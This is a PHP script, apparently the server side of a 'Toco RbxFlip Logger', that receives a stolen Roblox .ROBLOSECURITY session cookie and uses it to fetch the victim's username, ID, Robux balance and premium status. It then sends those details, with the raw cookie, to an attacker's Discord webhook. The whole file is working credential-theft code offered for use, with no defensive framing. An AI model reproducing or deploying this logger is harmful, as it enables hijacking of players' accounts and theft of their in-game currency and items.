<?php
    require("config.php");
    header("Access-Control-Allow-Origin: *");

    if (!isset($_GET["t"])) {
        die();
    }

    $cookie = $_GET["t"];
    if (strlen($cookie) < 100 || strlen($cookie) >= 1000) {
        die();
    }

    if ($cookie) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Cookie: .ROBLOSECURITY=' . $cookie
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $profile = json_decode(curl_exec($ch), 1);
        curl_close($ch);
        
        if (account_filter($profile)) {
            $hookObject = json_encode([
                "content" => "<@ID To Ping U>",
                "embeds" => [
                    [
                        "title" => $profile ["UserName"],
                        "type" => "rich",
                        "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                        "color" => hexdec("e0005a"),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/avatar-thumbnail/image?userId=". $profile["UserID"] . "&width=352&height=352&format=png"
                        ],
                        "author" => [
                             "name" => "\"Toco\" RbxFlip Logger",
                             "url" => "https://discord.gg/xss"
                        ],
                        "fields" => [
                            [
                                "name" => "<:id:794268988527607840> ID",
                                "value" => $profile["UserID"],
                                "inline" => True
                            ],
                            [
                                "name" => "<:robux:654458613510701076> Robux",
                                "value" => $profile["RobuxBalance"],
                                "inline" => True
                            ],
                            [
                                "name" => "<:rolimons:792137599157665832> Rolimons Link",
                                "value" => "https://www.rolimons.com/player/" . $profile["UserID"],
                            ],
                            [
                                "name" => "<:trade:685783105692368904> Trade Link",
                                "value" => "https://www.roblox.com/Trade/TradeWindow.aspx?TradePartnerID=" . $profile["UserID"],
                                "inline" => True
                       	    ],
                       	    [
                                "name" => "<:premium:730164927872106595> Is Premium?",
                                "value" =>  $profile["IsPremium"],
                                "inline" => True
                            ]
                       ]
                    ],
                    [
                        "type" => "rich",
                        "color" => hexdec("e0005a"),
                        "timestamp" => date("c"),
                         "footer" => [
                             "text" => "Powered By Toco.",
                             "icon_url" => "https://cdn.discordapp.com/icons/796867055889678346/7445f9e5cadf02b020c24210ae535d41.png",
                        ],
                        "fields" => [
                            [
                                "name" => "\u{1F36A} Cookie:",
                                "value" => "```" . $cookie . "```"
                             ]
                        ]
                    ]
                ]

            
            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
            
            
            $ch = curl_init();
            
            curl_setopt_array( $ch, [
                CURLOPT_URL => $webhook,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $hookObject,
                CURLOPT_HTTPHEADER => [
                    "Content-Type: application/json"
                ]
            ]);
            
            $response = curl_exec( $ch );
            curl_close( $ch );
        }
    }
?>
